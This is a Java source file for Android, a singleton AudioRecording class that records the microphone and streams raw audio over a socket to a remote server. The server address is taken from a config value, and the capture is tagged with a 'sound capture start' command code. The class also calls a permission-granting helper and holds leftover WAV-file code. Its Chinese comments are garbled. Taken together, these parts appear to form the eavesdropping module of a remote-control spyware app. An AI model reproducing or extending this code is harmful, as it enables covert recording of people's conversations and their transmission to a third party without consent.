/**
 * 
 */
package media;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;

import android.icu.text.SimpleDateFormat;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;
import order.Sock;
import order.order;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;

/**
 * @author Administrator
 *
 */
public class AudioRecording {
    //��Ƶ����-��˷� 
    public final static int AUDIO_INPUT = MediaRecorder.AudioSource.MIC; 
    ////����Ƶ�� 44100��Ŀǰ�ı�׼������ĳЩ�豸��Ȼ֧��22050��16000��11025 
    private final static int AUDIO_SAMPLE_RATE = 44100;  //44.1KHz,�ձ�ʹ�õ�Ƶ�� 
    private final static int AUDIO_CHANNEL=AudioFormat.CHANNEL_CONFIGURATION_MONO;//������:CHANNEL_IN_STEREO
    private final static int AUDIO_ENCODING=AudioFormat.ENCODING_PCM_8BIT;//λ����ENCODING_PCM_16BIT
      
	private AudioRecord audioRecord;   
    private boolean isRecording = false;// ��������¼�Ƶ�״̬   
    private int bufferSizeInBytes = 0;  // �������ֽڴ�С 
    private SendDataToServer sendDataToServer; 
    private String mIP;
    private int mPort;
    
    private static AudioRecording mInstance;
    private AudioRecording(){ 
        
    } 
    public synchronized static AudioRecording getInstance() 
    { 
        if(mInstance == null)  
            mInstance = new AudioRecording();  
        return mInstance;  
    } 
    public boolean startRecording(int port) { 
    	if(isRecording)return false;
    	mIP=ConfigCt.cIP;
    	mPort=port;
    	if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
    	new Thread(new AudioRecordThread()).start(); // ������Ƶ�ļ�д���߳� 
    	return true;
    }
    public void stopRecording() {  
    	isRecording = false;//ֹͣ�ļ�д��   

    } 
    private void releaseAudioRecord() {   
        if (audioRecord != null) {   
            Log.i(ConfigCt.TAG, "stopRecord");   
            isRecording = false;//ֹͣ�ļ�д��   
            audioRecord.stop();   
            audioRecord.release();//�ͷ���Դ   
            audioRecord = null;   
        }   
    } 
    private boolean creatAudioRecord() {     
        // ��û������ֽڴ�С   
        bufferSizeInBytes = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE,AUDIO_CHANNEL, AUDIO_ENCODING); 
        bufferSizeInBytes=AUDIO_SAMPLE_RATE;
        if(AudioRecord.ERROR_BAD_VALUE==bufferSizeInBytes)return false;
        // ����AudioRecord����   
        try{
        	audioRecord = new AudioRecord(AUDIO_INPUT,AUDIO_SAMPLE_RATE,AUDIO_CHANNEL, AUDIO_ENCODING, bufferSizeInBytes);  
        }catch( IllegalArgumentException e){
        	e.printStackTrace();
        	return false;
        }
        return true;
    } 
    class AudioRecordThread implements Runnable {   
        @Override  
        public void run() {   
        	try {
        		if(audioRecord == null) 
        			if(!creatAudioRecord())return;
           	 	try{
           	 		audioRecord.startRecording();
           	 		isRecording = true;// ��¼��״̬Ϊtrue
           	 		writeDateTOIO(audioRecord,bufferSizeInBytes);
           	 		releaseAudioRecord();
           	      
           	 	}catch(IllegalStateException e){
           		 e.printStackTrace();
           	 	}
        		//writeDateTOFile();//���ļ���д��������   
        		//copyWaveFile(AudioName, NewAudioName);//�������ݼ���ͷ�ļ�   
        	} catch (Exception e) {
				e.printStackTrace();
			}//try {
        }   
    }
    /**  
     * ���ｫ����д���ļ������ǲ����ܲ��ţ���ΪAudioRecord��õ���Ƶ��ԭʼ������Ƶ��  
     * �����Ҫ���žͱ������һЩ��ʽ���߱����ͷ��Ϣ�����������ĺô���������Զ���Ƶ�� �����ݽ��д���������Ҫ��һ����˵����TOM  
     * è������ͽ�����Ƶ�Ĵ���Ȼ�����·�װ ����˵�����õ�����Ƶ�Ƚ�������һЩ��Ƶ�Ĵ���  
     */  
    private void writeDateTOIO(AudioRecord audioRecord,int bufferSizeInBytes) {   
        byte[] audiodata = new byte[bufferSizeInBytes];  // newһ��byte����������һЩ�ֽ����ݣ���СΪ��������С  
        int readsize = 0;
        //SaveDataToFile saveDataToFile=new SaveDataToFile();
        sendDataToServer=new SendDataToServer(mIP,mPort,bufferSizeInBytes);
        while (isRecording) {   
            readsize = audioRecord.read(audiodata, 0, bufferSizeInBytes); 
            if(readsize==AudioRecord.ERROR_INVALID_OPERATION)break;
            if(readsize==AudioRecord.ERROR_BAD_VALUE)break;
            if(readsize==AudioRecord.ERROR_DEAD_OBJECT)break;
            if(readsize==AudioRecord.ERROR)break;
            if(readsize<=0)break;
            if(!sendDataToServer.send(audiodata))break;
            //saveDataToFile.write(audiodata);
            readsize = 0;
        }  
        sendDataToServer.close();
        //saveDataToFile.close();
    }
    private class SendDataToServer{
    	private final int BUF_SIZE_D=10;//��������С
    	private Sock sock;
    	private byte[] buf;
    	private int bufSize,p;
    	SendDataToServer(String IP,int port,int dataSize){
    		sock=new Sock(IP,port);
    		sock.oh.cmd=order.CMD_SOUND_CAP_START;
    		sock.connectServer();
    		bufSize=dataSize*BUF_SIZE_D;
    		buf=new byte[bufSize];
    		p=0;
    	}
    	public boolean send(byte[] data){
    		if(!sock.isConnected())return false;
    		if(p<bufSize){
    			System.arraycopy(data,0, buf,p, data.length);
    			p=p+data.length;
    		}else{
    			sock.data=buf;
            	sock.oh.len=bufSize;
            	if(!sock.SendOH())return false;
				if(!sock.SendData())return false;
				p=0;
    		}
    		return true;
    	}
    	public void close(){
    		buf=null;
    		if(sock!=null)sock.release();
    		sock=null;
    	}
    }
    private class SaveDataToFile{
        //¼������ļ� 
        private final static String AUDIO_RAW_FILENAME_EXT = ".raw"; 
        private final static String AUDIO_WAV_FILENAME_EXT  = ".wav"; 
        private final static String AUDIO_AMR_FILENAME_EXT  = ".amr";
        private final static String AUDIO_PCM_FILENAME_EXT  = ".pcm";
    	FileOutputStream fos = null;
    	private String pcmFilename;
    	private String wavFilename;
    	private File file;
    	public SaveDataToFile(){
    		try{
    			pcmFilename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, AUDIO_PCM_FILENAME_EXT);
    			wavFilename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, AUDIO_WAV_FILENAME_EXT);
    			file = new File(pcmFilename); 
    			fos = new FileOutputStream(file);// ����һ���ɴ�ȡ�ֽڵ��ļ� 
    		} catch (Exception e) {   
    			e.printStackTrace();   
    		}  
    	}
    	public boolean write(byte[] data){
    		if(fos==null)return false;
    		try {   
    			fos.write(data);   
    			return true;
    		} catch (IOException e) {   
                 e.printStackTrace();
                 return false;
    		}   
    	}
    	public void close(){
    		try { 
    			if(fos != null)fos.close();// �ر�д����  
    			//makePCMFileToWAVFile(pcmFilename,wavFilename,false);
    			copyWaveFile(pcmFilename,wavFilename);
    		} catch (IOException e) {   
    	            e.printStackTrace();   
    		}   
    	}
    }
    
    
    
    
    
    
    // ����õ��ɲ��ŵ���Ƶ�ļ�   
    private void copyWaveFile(String inFilename, String outFilename) {   
        FileInputStream in = null;   
        FileOutputStream out = null;   
        long totalAudioLen = 0;   
        long totalDataLen = totalAudioLen + 36;   
        long longSampleRate = AUDIO_SAMPLE_RATE;   
        int channels = 2;   
        long byteRate = 16 * AUDIO_SAMPLE_RATE * channels / 8;   
        byte[] data = new byte[bufferSizeInBytes];   
        try {   
            in = new FileInputStream(inFilename);   
            out = new FileOutputStream(outFilename);   
            totalAudioLen = in.getChannel().size();   
            totalDataLen = totalAudioLen + 36;   
            WriteWaveFileHeader(out, totalAudioLen, totalDataLen,   
                    longSampleRate, channels, byteRate);   
            while (in.read(data) != -1) {   
                out.write(data);   
            }   
            in.close();   
            out.close();   
        } catch (FileNotFoundException e) {   
            e.printStackTrace();   
        } catch (IOException e) {   
            e.printStackTrace();   
        }   
    }   
    /**  
     * �����ṩһ��ͷ��Ϣ��������Щ��Ϣ�Ϳ��Եõ����Բ��ŵ��ļ���  
     * Ϊ��Ϊɶ������44���ֽڣ��������û�����о�������������һ��wav  
     * ��Ƶ���ļ������Է���ǰ���ͷ�ļ�����˵����һ��Ŷ��ÿ�ָ�ʽ���ļ�����  
     * �Լ����е�ͷ�ļ���  
     */  
    private void WriteWaveFileHeader(FileOutputStream out, long totalAudioLen,   
            long totalDataLen, long longSampleRate, int channels, long byteRate)   
            throws IOException {   
        byte[] header = new byte[44];   
        header[0] = 'R'; // RIFF/WAVE header   
        header[1] = 'I';   
        header[2] = 'F';   
        header[3] = 'F';   
        header[4] = (byte) (totalDataLen & 0xff);   
        header[5] = (byte) ((totalDataLen >> 8) & 0xff);   
        header[6] = (byte) ((totalDataLen >> 16) & 0xff);   
        header[7] = (byte) ((totalDataLen >> 24) & 0xff);   
        header[8] = 'W';   
        header[9] = 'A';   
        header[10] = 'V';   
        header[11] = 'E';   
        header[12] = 'f'; // 'fmt ' chunk   
        header[13] = 'm';   
        header[14] = 't';   
        header[15] = ' ';   
        header[16] = 16; // 4 bytes: size of 'fmt ' chunk   
        header[17] = 0;   
        header[18] = 0;   
        header[19] = 0;   
        header[20] = 1; // format = 1   
        header[21] = 0;   
        header[22] = (byte) channels;   
        header[23] = 0;   
        header[24] = (byte) (longSampleRate & 0xff);   
        header[25] = (byte) ((longSampleRate >> 8) & 0xff);   
        header[26] = (byte) ((longSampleRate >> 16) & 0xff);   
        header[27] = (byte) ((longSampleRate >> 24) & 0xff);   
        header[28] = (byte) (byteRate & 0xff);   
        header[29] = (byte) ((byteRate >> 8) & 0xff);   
        header[30] = (byte) ((byteRate >> 16) & 0xff);   
        header[31] = (byte) ((byteRate >> 24) & 0xff);   
        header[32] = (byte) (2 * 16 / 8); // block align   
        header[33] = 0;   
        header[34] = 16; // bits per sample   
        header[35] = 0;   
        header[36] = 'd';   
        header[37] = 'a';   
        header[38] = 't';   
        header[39] = 'a';   
        header[40] = (byte) (totalAudioLen & 0xff);   
        header[41] = (byte) ((totalAudioLen >> 8) & 0xff);   
        header[42] = (byte) ((totalAudioLen >> 16) & 0xff);   
        header[43] = (byte) ((totalAudioLen >> 24) & 0xff);   
        out.write(header, 0, 44);   
    }   
	/**
	 * ��һ��pcm�ļ�ת��Ϊwav�ļ�
	 * @param pcmPath         pcm�ļ�·��
	 * @param destinationPath Ŀ���ļ�·��(wav)
	 * @param deletePcmFile   �Ƿ�ɾ��Դ�ļ�
	 * @return
	 
	public static boolean makePCMFileToWAVFile(String pcmPath, String destinationPath, boolean deletePcmFile) {
	    byte buffer[] = null;
	    int TOTAL_SIZE = 0;
	    File file = new File(pcmPath);
	    if (!file.exists()) {
	        return false;
	    }
	    TOTAL_SIZE = (int) file.length();
	    // ��������������ʵȵȡ������õ���16λ������ 8000 hz
	    WaveHeader header = new WaveHeader();
	    // �����ֶ� = ���ݵĴ�С��TOTAL_SIZE) +
	    // ͷ���ֶεĴ�С(������ǰ��4�ֽڵı�ʶ��RIFF�Լ�fileLength�����4�ֽ�)
	    header.fileLength = TOTAL_SIZE + (44 - 8);
	    header.FmtHdrLeth = 16;
	    header.BitsPerSample = 16;
	    header.Channels = 2;
	    header.FormatTag = 0x0001;
	    header.SamplesPerSec = 8000;
	    header.BlockAlign = (short) (header.Channels * header.BitsPerSample / 8);
	    header.AvgBytesPerSec = header.BlockAlign * header.SamplesPerSec;
	    header.DataHdrLeth = TOTAL_SIZE;

	    byte[] h = null;
	    try {
	        h = header.getHeader();
	    } catch (IOException e1) {
	        Log.e("PcmToWav", e1.getMessage());
	        return false;
	    }

	    if (h.length != 44) // WAV��׼��ͷ��Ӧ����44�ֽ�,�������44���ֽ��򲻽���ת���ļ�
	        return false;

	    // ��ɾ��Ŀ���ļ�
	    File destfile = new File(destinationPath);
	    if (destfile.exists())
	        destfile.delete();

	    // �ϳɵ�pcm�ļ������ݣ�д��Ŀ���ļ�
	    try {
	        buffer = new byte[1024 * 4]; // Length of All Files, Total Size
	        InputStream inStream = null;
	        OutputStream ouStream = null;

	        ouStream = new BufferedOutputStream(new FileOutputStream(
	                destinationPath));
	        ouStream.write(h, 0, h.length);
	        inStream = new BufferedInputStream(new FileInputStream(file));
	        int size = inStream.read(buffer);
	        while (size != -1) {
	            ouStream.write(buffer);
	            size = inStream.read(buffer);
	        }
	        inStream.close();
	        ouStream.close();
	    } catch (FileNotFoundException e) {
	        Log.e("PcmToWav", e.getMessage());
	        return false;
	    } catch (IOException ioe) {
	        Log.e("PcmToWav", ioe.getMessage());
	        return false;
	    }
	    if (deletePcmFile) {
	        file.delete();
	    }
	    Log.i("PcmToWav", "makePCMFileToWAVFile  success!" + new SimpleDateFormat("yyyy-MM-dd hh:mm").format(new Date()));
	    return true;
	}
	*/
}
